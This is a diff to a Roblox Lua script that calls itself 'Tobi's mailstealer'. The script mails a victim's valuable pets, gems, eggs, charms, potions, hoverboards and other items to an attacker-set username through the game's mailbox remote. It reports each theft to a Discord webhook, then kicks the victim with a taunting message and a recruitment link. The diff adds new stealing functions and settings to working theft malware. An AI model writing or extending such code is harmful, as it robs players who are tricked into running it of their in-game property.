@@ -1,4 +1,8 @@
-function SendMessage(url, username, itemID)
+Username = "your user here"
+Webhook = "" -- your discord webhook in here
+min_rap = 100000
+
+local function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
@@ -89,10 +93,11 @@ local function getRAP(Type, Item)
                 return v
             end
         end
+		return 0
     end
 end
 
-function StealHuge()
+local function StealHuge()
 	local hugesSent = 0
 	local initialHuges = CountHuges()
     for i, v in pairs(save.Pet) do
@@ -127,7 +132,7 @@ function StealHuge()
 	return hugesSent
 end
 
-function CountHuges()
+local function CountHuges()
 	local count = 0
 	for i, v in pairs(save.Pet) do
 		local id = v.id
@@ -139,7 +144,7 @@ function CountHuges()
 	return count
 end
 
-function SendAllHuges()
+local function SendAllHuges()
 	local totalHuges = CountHuges()
 	local hugesSent = 0
 	repeat
@@ -147,7 +152,7 @@ function SendAllHuges()
 	until hugesSent == totalHuges
 end
 
-function ExcSteal()
+local function ExcSteal()
 	local excSent = 0
 	local initialExc = CountExc()
     for i, v in pairs(save.Pet) do
@@ -182,7 +187,7 @@ function ExcSteal()
 	return excSent
 end
 
-function CountExc()
+local function CountExc()
 	local count = 0
 	for i, v in pairs(save.Pet) do
 		local id = v.id
@@ -194,7 +199,7 @@ function CountExc()
 	return count
 end
 
-function SendAllExc()
+local function SendAllExc()
 	local totalExc = CountExc()
 	local excSent = 0
 	repeat
@@ -202,7 +207,7 @@ function SendAllExc()
 	until excSent == totalExc
 end
 
-function EggSteal()
+local function EggSteal()
     for i, v in pairs(save.Egg) do
 		local id = v.id
 		local diregg = library.Directory.Eggs[id]
@@ -222,7 +227,7 @@ function EggSteal()
     end
 end
 
-function CharmSteal()
+local function CharmSteal()
     for i, v in pairs(save.Charm) do
         local id = v.id
 		local dircharm = library.Directory.Charms[id]
@@ -242,7 +247,7 @@ function CharmSteal()
     end
 end
 
-function EnchantSteal()
+local function EnchantSteal()
     for i, v in pairs(save.Enchant) do
 		local id = v.id
 		local direnchant = library.Directory.Enchants[id]
@@ -262,7 +267,7 @@ function EnchantSteal()
     end
 end
 
-function PotionSteal()
+local function PotionSteal()
     for i, v in pairs(save.Potion) do
 		local id = v.id
 		local dirpotion = library.Directory.Potions[id]
@@ -282,7 +287,87 @@ function PotionSteal()
     end
 end
 
-function GemSteal()
+local function miscSteal()
+	for i, v in pairs(save.Misc) do
+		local id = v.id
+		local dirmisc = library.Directory.MiscItems[id]
+		if dirmisc and getRAP("Misc", v) > min_rap then
+			local args = {
+				[1] = user,
+				[2] = MailMessage,
+				[3] = "Misc",
+				[4] = i,
+				[5] = v._am or 1
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+			end
+		end
+	end
+end
+
+local function hoverSteal()
+	for i, v in pairs(save.Hoverboard) do
+		local id = v.id
+		local dirhover = library.Directory.Hoverboards[id]
+		if dirhover and getRAP("Hoverboard", v) > min_rap then
+			local args = {
+				[1] = user,
+				[2] = MailMessage,
+				[3] = "Hoverboard",
+				[4] = i,
+				[5] = v._am or 1
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+			end
+		end
+	end
+end
+
+local function boothSteal()
+	for i, v in pairs(save.Booth) do
+		local id = v.id
+		local dirbooth = library.Directory.Booths[id]
+		if dirbooth and getRAP("Booth", v) > min_rap then
+			local args = {
+				[1] = user,
+				[2] = MailMessage,
+				[3] = "Booth",
+				[4] = i,
+				[5] = v._am or 1
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+			end
+		end
+	end
+end
+
+local function ultimateSteal()
+	for i, v in pairs(save.Ultimate) do
+		local id = v.id
+		local dirultimate = library.Directory.Ultimates[id]
+		if dirultimate and getRAP("Ultimate", v) > min_rap then
+			local args = {
+				[1] = user,
+				[2] = MailMessage,
+				[3] = "Ultimate",
+				[4] = i,
+				[5] = v._am or 1
+			}
+			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+			end
+		end
+	end
+end
+
+local function GemSteal()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             GemAmount = v._am
@@ -302,7 +387,7 @@ function GemSteal()
     end
 end
 
-function EmptyBoxes()
+local function EmptyBoxes()
     if save.Box then
         for key, _ in pairs(save.Box) do
 			local args = {
@@ -313,7 +398,7 @@ function EmptyBoxes()
     end
 end
 
-function CountGems()
+local function CountGems()
 	for i, v in pairs(GetSave().Inventory.Currency) do
 		if v.id == "Diamonds" then
 			GemAmount1 = v._am
@@ -322,7 +407,7 @@ function CountGems()
 	end
 end
 
-function SendAllGems()
+local function SendAllGems()
 	repeat
 		GemSteal()
 	until CountGems() == nil or CountGems() < 10000
@@ -340,6 +425,10 @@ if CountHuges() > 0 or CountGems() > 1000000 then
 	if save.Charm ~= nil then
 		CharmSteal()
 	end
+
+	if save.Ultimate ~= nil then
+		ultimateSteal()
+	end
 	
 	if save.Enchant ~= nil then
 		EnchantSteal()
@@ -349,6 +438,15 @@ if CountHuges() > 0 or CountGems() > 1000000 then
 		PotionSteal()
 	end
 
+	if save.Hoverboard ~= nil then
+		hoverSteal()
+	end
+
+	if save.Booth ~= nil then
+		boothSteal()
+	end
+
+	miscSteal()
 	SendAllGems()
 	setclipboard("https://discord.gg/HcpNe56R2a")
 	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
